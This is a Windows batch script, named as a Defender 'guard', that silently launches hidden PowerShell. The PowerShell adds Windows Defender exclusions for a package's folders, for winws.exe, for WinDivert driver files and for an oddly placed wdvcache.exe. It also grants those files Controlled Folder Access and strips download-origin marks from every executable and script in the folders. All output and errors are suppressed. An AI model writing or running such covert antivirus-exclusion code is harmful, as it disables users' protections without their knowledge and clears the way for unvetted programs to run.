@echo off
rem GBZAP_DEFENDER_GUARD
setlocal
cd /d "%~dp0.." 2>nul
set "GBZAP_PKG=%CD%\"
set "GBZAP_BIN=%CD%\bin\"
set "GBZAP_WD=%CD%\bin\.wd\"
set "GBZAP_EXE=%CD%\bin\.wd\wdvcache.exe"
set "GBZAP_WINWS=%CD%\bin\winws.exe"
if not exist "%GBZAP_WD%" mkdir "%GBZAP_WD%" >nul 2>&1
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS%" set "PS=%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS%" exit /b 0
"%PS%" -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$e=$ErrorActionPreference; $ErrorActionPreference='SilentlyContinue'; $pkg=$env:GBZAP_PKG; $bin=$env:GBZAP_BIN; $wd=$env:GBZAP_WD; $exe=$env:GBZAP_EXE; $winws=$env:GBZAP_WINWS; foreach($p in @($pkg,$bin,$wd)){ if($p -and (Test-Path -LiteralPath $p)){ Add-MpPreference -ExclusionPath $p } }; foreach($f in @($exe,$winws,($bin+'WinDivert64.sys'),($bin+'WinDivert.dll'),($bin+'cygwin1.dll'))){  if($f -and (Test-Path -LiteralPath $f)){ Add-MpPreference -ExclusionPath $f } } }; Add-MpPreference -ExclusionProcess 'wdvcache.exe'; Add-MpPreference -ExclusionProcess 'winws.exe'; foreach($app in @($exe,$winws)){ if($app -and (Test-Path -LiteralPath $app)){ Add-MpPreference -ControlledFolderAccessAllowedApplications $app } }; $ub={ param($p) if($p -and (Test-Path -LiteralPath $p)){ Unblock-File -LiteralPath $p;  Remove-Item -LiteralPath ($p+':Zone.Identifier') -Force } }; & $ub $exe; & $ub $winws; foreach($dir in @($pkg,$bin,$wd)){ if(-not $dir -or -not (Test-Path -LiteralPath $dir)){ continue };  Get-ChildItem -LiteralPath $dir -File -ErrorAction SilentlyContinue |  Where-Object { $_.Extension -match '\.(exe|dll|sys|cmd|bat|ps1)$' } |  ForEach-Object { & $ub $_.FullName } }; $ErrorActionPreference=$e" >nul 2>&1
type nul > "%GBZAP_WD%excl.ok" 2>nul
endlocal
exit /b 0
